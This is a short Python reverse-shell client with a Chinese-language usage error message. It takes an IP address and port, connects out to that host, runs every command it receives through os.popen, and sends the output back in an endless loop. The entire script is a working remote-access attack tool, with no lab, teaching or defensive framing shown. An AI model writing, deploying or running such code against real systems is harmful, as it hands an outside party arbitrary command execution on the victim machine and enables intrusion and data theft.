import socket
import sys
import os

if len(sys.argv) == 3:
    ip = sys.argv[1]
    port = int(sys.argv[2])
    target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target_socket.connect((ip, port))
    while True:
        cmd = target_socket.recv(4096)
        results = os.popen(cmd.decode())
        msg = ''
        for result in results:
            msg += result
        if not msg:
            msg = 'command error!'
        target_socket.send(msg.encode(encoding='utf-8'))
else:
    print('输入参数错误！')